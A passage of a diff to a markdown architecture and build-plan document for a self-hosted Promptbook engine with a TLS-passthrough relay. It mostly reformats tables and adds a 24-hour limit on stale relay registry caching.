-| Engine DNS        | Cloudflare DNS, DNS-only (not proxied, so TLS stays end to end)                                                                                  | A wildcard record pointing at all relays; per-engine records once relays are federated. A second DNS provider from v1 |
-| Dashboard         | One Cloudflare Worker (Vite SPA plus Hono API), D1 via Drizzle, a Durable Object per engine for status and offline alarms, Cron Triggers, Stripe | No content, so not security-critical                                                                                  |
-| Releases          | GitHub Actions with Sigstore signing                                                                                                             | Same mechanism as npm provenance                                                                                      |
-| Monitoring jobs   | Cloudflare Workers Cron Triggers                                                                                                                 | Rebuild monitor, public-face check, abuse feeds, CT watch for the engine domain                                       |
-| Release artifacts | Cloudflare R2, mirrored on GitHub Releases                                                                                                       | Engines verify the signature and the log entry, so the storage location is not trusted                                |
-| Engine UI bundle  | Built by us in GitHub Actions, stored on Cloudflare R2 with the release artifacts                                                                | Engines download, verify and serve it; we never serve it to browsers                                                  |
+| Part | Where | Why |
+| --- | --- | --- |
+| Relay | One VPS to start (e.g. Hetzner, EU), a second before the paid launch, then other providers (e.g. OVH, Fly.io) and independent operators | Needs raw TCP on 443 and long-lived connections, so not Workers. EU suits GDPR. |
+| Engine DNS | Cloudflare DNS, DNS-only (not proxied, so TLS stays end to end) | A wildcard record pointing at all relays; per-engine records once relays are federated. A second DNS provider from v1 |
+| Dashboard | One Cloudflare Worker (Vite SPA plus Hono API), D1 via Drizzle, a Durable Object per engine for status and offline alarms, Cron Triggers, Stripe | No content, so not security-critical |
+| Releases | GitHub Actions with Sigstore signing | Same mechanism as npm provenance |
+| Monitoring jobs | Cloudflare Workers Cron Triggers | Rebuild monitor, public-face check, abuse feeds, CT watch for the engine domain |
+| Infrastructure and monitoring | OpenTofu (Hetzner and Cloudflare providers) plus cloud-init; monitoring on Cloudflare (Workers observability, Analytics Engine) | Everything reproducible from the repo. An uptime check from outside Cloudflare is added later |
+| Release artifacts | Cloudflare R2, mirrored on GitHub Releases | Engines verify the signature and the log entry, so the storage location is not trusted |
+| Engine UI bundle | Built by us in GitHub Actions, stored on Cloudflare R2 with the release artifacts | Engines download, verify and serve it; we never serve it to browsers |
 
 **TypeScript stack**
 
-| Layer                       | Choice                                                                                                                                                                                                                                                                                                                                       |
-| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Package manager and runtime | Bun as the package manager; Node 24 LTS as the runtime (Cloudflare Workers for the dashboard)                                                                                                                                                                                                                                                |
-| Engine UI                   | Vite, React, TanStack Router, Query and Table, Tailwind; a design system shared with the dashboard; Paraglide i18n (English and Czech); CodeMirror 6 for the book editor (works under strict CSP). Static hashed bundle, closed, served by the engine                                                                                        |
-| Engine API                  | Hono on Node recommended (the same framework as our mock engine and dashboard API). Contracts are framework-agnostic zod schemas with a generated OpenAPI document                                                                                                                                                                           |
-| Passkeys                    | `@simplewebauthn/server` and `@simplewebauthn/browser`                                                                                                                                                                                                                                                                                       |
-| Certificates                | `acme-client`, plus a small TLS-ALPN-01 responder on `node:tls` and `@peculiar/x509`; or Caddy in front of the engine as a ready-made alternative                                                                                                                                                                                            |
-| Tunnel client               | `node:tls` with HTTP/2 or yamux multiplexing                                                                                                                                                                                                                                                                                                 |
-| Relay                       | Plain Node `node:net` and `node:tls` plus `ws`, no HTTP framework, by design: parse the SNI from the ClientHello, then pipe bytes. About 1,000 lines, small enough to rewrite in Go if memory per connection ever matters                                                                                                                    |
-| Release verification        | `sigstore` npm package                                                                                                                                                                                                                                                                                                                       |
-| CT monitor                  | crt.sh and Cert Spotter APIs, two sources                                                                                                                                                                                                                                                                                                    |
-| Dashboard                   | Vite SPA (React, TanStack Router, Query and Table, Tailwind) plus a Hono API in one Cloudflare Worker; D1 via Drizzle ORM (schema in TypeScript, generated and reviewed SQL migrations, expand/contract); a Durable Object per engine; Cron Triggers; Stripe. TanStack Start may come later for public pages only; the API always stays Hono |
+| Layer | Choice |
+| --- | --- |
+| Package manager and runtime | Bun as the package manager; Node 24 LTS as the runtime (Cloudflare Workers for the dashboard) |
+| Engine UI | Vite, React, TanStack Router, Query and Table, Tailwind; a design system shared with the dashboard; Paraglide i18n (English and Czech); CodeMirror 6 for the book editor (works under strict CSP). Static hashed bundle, closed, served by the engine |
+| Engine API | Hono on Node recommended (the same framework as our mock engine and dashboard API). Contracts are framework-agnostic zod schemas with a generated OpenAPI document |
+| Passkeys | `@simplewebauthn/server` and `@simplewebauthn/browser` |
+| Certificates | `acme-client`, plus a small TLS-ALPN-01 responder on `node:tls` and `@peculiar/x509`; or Caddy in front of the engine as a ready-made alternative |
+| Tunnel client | `node:tls` with HTTP/2 or yamux multiplexing |
+| Relay | Plain Node `node:net` and `node:tls` plus `ws`, no HTTP framework, by design: parse the SNI from the ClientHello, then pipe bytes. About 1,000 lines, small enough to rewrite in Go if memory per connection ever matters |
+| Release verification | `sigstore` npm package |
+| CT monitor | crt.sh and Cert Spotter APIs, two sources |
+| Dashboard | Vite SPA (React, TanStack Router, Query and Table, Tailwind) plus a Hono API in one Cloudflare Worker; D1 via Drizzle ORM (schema in TypeScript, generated and reviewed SQL migrations, expand/contract); a Durable Object per engine; Cron Triggers; Stripe. TanStack Start may come later for public pages only; the API always stays Hono |
 
 **Known hard problems**
 
@@ -425,12 +426,12 @@ If our infrastructure fails, the user loses remote access, but agents keep runni
 
 **Availability and failure modes**
 
-| Failure                      | Effect                                | Fallback                                                                                                                                                          |
-| ---------------------------- | ------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| One relay region down        | None for most users                   | Each engine holds tunnels to every relay in its list, and DNS returns all of them, so browsers retry the next IP. While there is only one relay, see the next row |
-| All relays down              | No remote access; agents keep running | Break-glass local login (below)                                                                                                                                   |
-| Dashboard or Cloudflare down | No signup, billing or status pages    | The relay caches the engine registry, so routing keeps working. From v1, a second DNS provider covers a Cloudflare DNS outage                                     |
-| Engine offline               | The UI is unreachable                 | The dashboard shows offline; a Durable Object alarm emails the owner after 3 missed heartbeats                                                                    |
+| Failure | Effect | Fallback |
+| --- | --- | --- |
+| One relay region down | None for most users | Each engine holds tunnels to every relay in its list, and DNS returns all of them, so browsers retry the next IP. While there is only one relay, see the next row |
+| All relays down | No remote access; agents keep running | Break-glass local login (below) |
+| Dashboard or Cloudflare down | No signup, billing or status pages | The relay keeps serving cached registry entries for up to 24 hours, so routing survives a shorter outage. From v1, a second DNS provider covers a Cloudflare DNS outage |
+| Engine offline | The UI is unreachable | The dashboard shows offline; a Durable Object alarm emails the owner after 3 missed heartbeats |
 
 **Break-glass local login:** `engine login --local` on the server prints a one-time link for `http://localhost:4440`, reached through `ssh -L`. Passkeys are bound to the engine hostname and do not work on localhost, so this needs shell access, the same trust level as an owner reset. Proposed target: 99.9 % relay availability from v1, with a public status page.
 
@@ -452,11 +453,11 @@ The engine sends Web Push notifications directly to the owner's browsers and ins
 
 Customers on the predecessor (a public IP with nginx and Let's Encrypt) move to the new engine by importing their data into a fresh install, not by an in-place upgrade. The new engine supports these modes:
 
-| Mode                   | Reachable via                                        | For                                                                                            |
-| ---------------------- | ---------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
-| `tunnel` (new default) | Our relay, `<id>.<engine domain>` or a custom domain | Everyone without a public IP, and everyone who wants the dashboard                             |
-| `direct`               | Its own public IP and domain                         | Advanced self-hosters only (public IP, open port, own certificates); not offered in onboarding |
-| `local`                | 127.0.0.1 only                                       | Development, air-gapped use                                                                    |
+| Mode | Reachable via | For |
+| --- | --- | --- |
+| `tunnel` (new default) | Our relay, `<id>.<engine domain>` or a custom domain | Everyone without a public IP, and everyone who wants the dashboard |
+| `direct` | Its own public IP and domain | Advanced self-hosters only (public IP, open port, own certificates); not offered in onboarding |
+| `local` | 127.0.0.1 only | Development, air-gapped use |
 
 - **Import:** `engine import <export>` (proposal) loads the agents, books, files, users and settings exported from the old deployment into a fresh engine. The old deployment keeps running until the owner switches over.
 - **Switching:** `engine connect --link <code>` generates the keys, registers the engine, gets the certificate and binds to localhost. A domain the old deployment used can stay as the custom domain (CNAME to the relay).
@@ -501,7 +502,7 @@ GET /internal/v1/engines/{engineId}
       "status": "active" | "suspended" }
 ```
 
-The relay calls this when an engine authenticates its tunnel, using the engine ID the engine presents. It keeps a hostname → engine map only for engines connected to it, refreshes each entry every 5 minutes, and keeps stale entries if the dashboard is unreachable. A relay never has to route a hostname whose engine has no tunnel to it, so no lookup by hostname is needed. `suspended` (abuse or unpaid) refuses the tunnel; an engine suspended while connected is cut off at the next refresh.
+The relay calls this when an engine authenticates its tunnel, using the engine ID the engine presents. It keeps a hostname → engine map only for engines connected to it, refreshes each entry every 5 minutes, and keeps stale entries for at most 24 hours if the dashboard is unreachable. After that the entry counts as unavailable and the relay refuses the tunnel. A relay never has to route a hostname whose engine has no tunnel to it, so no lookup by hostname is needed. `suspended` (abuse or unpaid) refuses the tunnel; an engine suspended while connected is cut off at the next 5-minute refresh, or within 24 hours during a dashboard outage.
 
 Each custom hostname has an entry in `claims`: an Ed25519 signature by the engine key over `"ptbk-hostname-v1" | hostname | engineId`. The relay drops any hostname whose claim does not verify. Default hostnames need no claim, because they are derived from the key.
 
@@ -549,13 +550,13 @@ The UI bundle is an artifact of the same release (`"kind": "ui"`), so engine and
 
 **6. Engine configuration**
 
-| Variable                  | Values                                                            |
-| ------------------------- | ----------------------------------------------------------------- |
-| `PTBK_MODE`               | `tunnel`, `direct`, `local`                                       |
-| `PTBK_UPDATE_POLICY`      | `auto` (default), `manual`, `pinned` (with `PTBK_PINNED_VERSION`) |
-| `PTBK_CUSTOM_DOMAIN`      | Optional hostname, verified by a CNAME to the relay               |
-| `HTTPS_PROXY`, `NO_PROXY` | Standard proxy settings for the tunnel and updates                |
-| `PTBK_DATA_DIR`           | Keys, certificates, database and audit log; mode 0700             |
+| Variable | Values |
+| --- | --- |
+| `PTBK_MODE` | `tunnel`, `direct`, `local` |
+| `PTBK_UPDATE_POLICY` | `auto` (default), `manual`, `pinned` (with `PTBK_PINNED_VERSION`) |
+| `PTBK_CUSTOM_DOMAIN` | Optional hostname, verified by a CNAME to the relay |
+| `HTTPS_PROXY`, `NO_PROXY` | Standard proxy settings for the tunnel and updates |
+| `PTBK_DATA_DIR` | Keys, certificates, database and audit log; mode 0700 |
 
 ## Build plan
 
@@ -563,16 +564,16 @@ The work splits between two repos that share one contracts package. The engine s
 
 **Components and where they live (proposal)**
 
-| Component                                                                                                       | Location                                                                                                                          | Runs on                                        |
-| --------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
-| Contracts: zod schemas for registration, registry, tunnel, heartbeat, release log, and the engine API (OpenAPI) | `webgptorg/app`, `packages/protocol` for now (MIT, no private code); moves to `promptbook` or npm before the engine depends on it | Shared by all                                  |
-| Engine: API, pre-auth gateway, sign-in, UI loader                                                               | `promptbook` (public)                                                                                                             | Customer's server                              |
-| Engine tunnel: tunnel client, ACME, CT monitor, updater                                                         | `promptbook`, `packages/engine-tunnel`                                                                                            | Customer's server                              |
-| Engine UI: the full app, closed                                                                                 | `webgptorg/app`                                                                                                                   | Built by us; served by the engine              |
-| Mock engine and conformance suite                                                                               | `webgptorg/app`                                                                                                                   | CI and local development                       |
-| Relay                                                                                                           | `webgptorg/app`                                                                                                                   | One VPS to start (e.g. Hetzner, EU), then more |
-| Dashboard                                                                                                       | `webgptorg/app`                                                                                                                   | Cloudflare Workers                             |
-| Release tooling and rebuild monitor                                                                             | `promptbook`, `packages/release`; the UI bundle is built in `webgptorg/app` and joins the same signed release                     | GitHub Actions, Workers Cron                   |
+| Component | Location | Runs on |
+| --- | --- | --- |
+| Contracts: zod schemas for registration, registry, tunnel, heartbeat, release log, and the engine API (OpenAPI) | `webgptorg/app`, `packages/protocol` for now (MIT, no private code); moves to `promptbook` or npm before the engine depends on it | Shared by all |
+| Engine: API, pre-auth gateway, sign-in, UI loader | `promptbook` (public) | Customer's server |
+| Engine tunnel: tunnel client, ACME, CT monitor, updater | `promptbook`, `packages/engine-tunnel` | Customer's server |
+| Engine UI: the full app, closed | `webgptorg/app` | Built by us; served by the engine |
+| Mock engine and conformance suite | `webgptorg/app` | CI and local development |
+| Relay | `webgptorg/app` | One VPS to start (e.g. Hetzner, EU), then more |
+| Dashboard | `webgptorg/app` | Cloudflare Workers |
+| Release tooling and rebuild monitor | `promptbook`, `packages/release`; the UI bundle is built in `webgptorg/app` and joins the same signed release | GitHub Actions, Workers Cron |
 
 **One source for contracts:** the protocol and engine API contracts exist once and are never copied. The engine and our apps pin the same published version, and contract tests run on both sides.
 
@@ -591,22 +592,22 @@ The work splits between two repos that share one contracts package. The engine s
 
 **v0 epics**
 
-| Epic                        | Done when                                                                                                                                                                                                   |
-| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Protocol package            | All six interfaces and the engine API contract as strict schemas, with contract tests used by the engine, relay, dashboard and engine UI                                                                    |
-| Relay                       | Spike criteria pass; one relay serves many engines, and a load test sustains 1,000 idle tunnels on one small VPS (target to confirm); an engine with N relays in its list keeps working when one is stopped |
-| Engine tunnel mode          | One install command reaches a running engine; certificates renew; the CT monitor alerts on a test certificate; a test custom domain works with one DNS record and one registry entry                        |
-| Engine sign-in              | Owner setup with the setup secret, passkeys, owner reset, break-glass login, step-up for sensitive actions, passwords off in strict mode                                                                    |
-| Engine hardening            | Every check in Security hardening passes as a CI gate; custom JS off in zero-trust mode; security panel                                                                                                     |
-| Pre-auth gateway            | The engine's app server listens on 127.0.0.1 only; an anonymous scan of an engine reaches nothing but the sign-in and setup pages and the agents marked public                                              |
-| Backups                     | Encrypted backup to customer storage on a schedule; a restore onto a fresh machine succeeds in a test                                                                                                       |
-| Distribution                | Signed Docker image and an installer that refuses a tampered image or script                                                                                                                                |
-| Updates                     | Signed releases in Rekor; delay, threshold and revocation enforced; update policy setting; rebuild monitor live                                                                                             |
-| Dashboard                   | Passkey signup, Stripe, engine list, heartbeat status in a Durable Object, offline alert emails, links to engines                                                                                           |
-| Engine UI                   | The full app runs on the mock engine through the relay; the bundle is signed and joins a release; the loader refuses a tampered or revoked bundle                                                           |
-| Mock engine and conformance | Relay, dashboard and engine UI pass end to end against the mock engine in CI; the conformance suite runs against any engine URL                                                                             |
-| Abuse controls              | Separate engine domain, PSL request submitted, public-face check, abuse address and takedown runbook                                                                                                        |
-| Public documents            | Security document, privacy policy with the metadata table, a guide to verifying the claims                                                                                                                  |
+| Epic | Done when |
+| --- | --- |
+| Protocol package | All six interfaces and the engine API contract as strict schemas, with contract tests used by the engine, relay, dashboard and engine UI |
+| Relay | Spike criteria pass; one relay serves many engines, and a load test sustains 1,000 idle tunnels on one small VPS (target to confirm); an engine with N relays in its list keeps working when one is stopped |
+| Engine tunnel mode | One install command reaches a running engine; certificates renew; the CT monitor alerts on a test certificate; a test custom domain works with one DNS record and one registry entry |
+| Engine sign-in | Owner setup with the setup secret, passkeys, owner reset, break-glass login, step-up for sensitive actions, passwords off in strict mode |
+| Engine hardening | Every check in Security hardening passes as a CI gate; custom JS off in zero-trust mode; security panel |
+| Pre-auth gateway | The engine's app server listens on 127.0.0.1 only; an anonymous scan of an engine reaches nothing but the sign-in and setup pages and the agents marked public |
+| Backups | Encrypted backup to customer storage on a schedule; a restore onto a fresh machine succeeds in a test |
+| Distribution | Signed Docker image and an installer that refuses a tampered image or script |
+| Updates | Signed releases in Rekor; delay, threshold and revocation enforced; update policy setting; rebuild monitor live |
+| Dashboard | Passkey signup, Stripe, engine list, heartbeat status in a Durable Object, offline alert emails, links to engines |
+| Engine UI | The full app runs on the mock engine through the relay; the bundle is signed and joins a release; the loader refuses a tampered or revoked bundle |
+| Mock engine and conformance | Relay, dashboard and engine UI pass end to end against the mock engine in CI; the conformance suite runs against any engine URL |
+| Abuse controls | Separate engine domain, PSL request submitted, public-face check, abuse address and takedown runbook |
+| Public documents | Security document, privacy policy with the metadata table, a guide to verifying the claims |
 
 **Gate to v0 release:** David tries to break it, Pavol reviews the cryptography and key handling, and Anka reviews onboarding.
 
@@ -614,25 +615,25 @@ The work splits between two repos that share one contracts package. The engine s
 
 **Decided in the 2026-10-16 interviews**
 
-| Topic              | Decision                                                                                                                                                                                                                                                                                                      |
-| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Architecture       | Engine serves the UI (our signed bundle) from its own origin; our relay passes TLS through by SNI                                                                                                                                                                                                             |
-| Entry point        | app.ptbk.io for the account, engine list and billing; the full app with all private data is served by each engine at \<engineId>.\<engine domain>, with the same look (not one origin)                                                                                                                        |
-| UI delivery        | Engine UI is ours and closed. The engine downloads our signed bundle, verifies it like a release and serves it from its own origin; we never serve UI live (see Architecture)                                                                                                                                 |
-| Repos              | Engine open in webgptorg/promptbook; relay, dashboard, engine UI and mock engine private in webgptorg/app. Contracts start in webgptorg/app and move public before the engine depends on them                                                                                                                 |
-| Relay              | Required for engines without a public address and never decrypts. One shared relay serves many engines; the engine supports N relays from v0. One VPS to start, then more providers and legally independent operators. Own relay or direct connection for advanced users                                      |
-| Custom domains     | Enterprise only, set up individually (DNS, certificates); supported by the architecture from v0, not in the standard plan or self-service                                                                                                                                                                     |
-| Billing            | No technical enforcement against a modified engine; the terms of service cover it. Revisit only if abuse becomes a real economic problem                                                                                                                                                                      |
-| Public Suffix List | Apply early; does not block launch, with the interim measures in Abuse on our domains                                                                                                                                                                                                                         |
-| Data home          | Engine only; we store no content, not even encrypted. Engine storage is local (SQLite, or the customer's own Postgres); no hosted database service                                                                                                                                                            |
-| Keys and recovery  | Passkeys registered on the engine; recovery by reset on the engine; no recovery phrase                                                                                                                                                                                                                        |
-| Multi-user         | Single owner in v0; the engine stores roles from day one so members can be added later                                                                                                                                                                                                                        |
-| Client trust       | Solved by the architecture: we never serve code to browsers; the engine serves only a UI bundle from a signed, logged, delayed release                                                                                                                                                                        |
-| LLM providers      | Trusted by the customer; zero trust covers Promptbook. Local models later                                                                                                                                                                                                                                     |
-| Abuse              | Must be mitigated on our engine domain (see Abuse on our domains)                                                                                                                                                                                                                                             |
-| Engine security    | Maximal, best practice, ready for enterprise extension                                                                                                                                                                                                                                                        |
-| Stack              | TypeScript throughout; Bun manages packages, Node 24 LTS runs them. Dashboard: Vite SPA and Hono API in one Cloudflare Worker, D1 via Drizzle. Engine UI: Vite, React, TanStack, Tailwind, Paraglide, CodeMirror 6. Engine API: Hono on Node, zod contracts with generated OpenAPI. Relay: plain Node with ws |
-| Updates            | Automatic by default (72 h delay; security fixes 24 h with 2-of-3 maintainer signatures); owner may switch to manual approval or a pinned version                                                                                                                                                             |
+| Topic | Decision |
+| --- | --- |
+| Architecture | Engine serves the UI (our signed bundle) from its own origin; our relay passes TLS through by SNI |
+| Entry point | app.ptbk.io for the account, engine list and billing; the full app with all private data is served by each engine at \<engineId>.\<engine domain>, with the same look (not one origin) |
+| UI delivery | Engine UI is ours and closed. The engine downloads our signed bundle, verifies it like a release and serves it from its own origin; we never serve UI live (see Architecture) |
+| Repos | Engine open in webgptorg/promptbook; relay, dashboard, engine UI and mock engine private in webgptorg/app. Contracts start in webgptorg/app and move public before the engine depends on them |
+| Relay | Required for engines without a public address and never decrypts. One shared relay serves many engines; the engine supports N relays from v0. One VPS to start, then more providers and legally independent operators. Own relay or direct connection for advanced users |
+| Custom domains | Enterprise only, set up individually (DNS, certificates); supported by the architecture from v0, not in the standard plan or self-service |
+| Billing | No technical enforcement against a modified engine; the terms of service cover it. Revisit only if abuse becomes a real economic problem |
+| Public Suffix List | Apply early; does not block launch, with the interim measures in Abuse on our domains |
+| Data home | Engine only; we store no content, not even encrypted. Engine storage is local (SQLite, or the customer's own Postgres); no hosted database service |
+| Keys and recovery | Passkeys registered on the engine; recovery by reset on the engine; no recovery phrase |
+| Multi-user | Single owner in v0; the engine stores roles from day one so members can be added later |
+| Client trust | Solved by the architecture: we never serve code to browsers; the engine serves only a UI bundle from a signed, logged, delayed release |
+| LLM providers | Trusted by the customer; zero trust covers Promptbook. Local models later |
+| Abuse | Must be mitigated on our engine domain (see Abuse on our domains) |
+| Engine security | Maximal, best practice, ready for enterprise extension |
+| Stack | TypeScript throughout; Bun manages packages, Node 24 LTS runs them. Dashboard: Vite SPA and Hono API in one Cloudflare Worker, D1 via Drizzle. Engine UI: Vite, React, TanStack, Tailwind, Paraglide, CodeMirror 6. Engine API: Hono on Node, zod contracts with generated OpenAPI. Relay: plain Node with ws |
+| Updates | Automatic by default (72 h delay; security fixes 24 h with 2-of-3 maintainer signatures); owner may switch to manual approval or a pinned version |
 
 **Open questions**
 
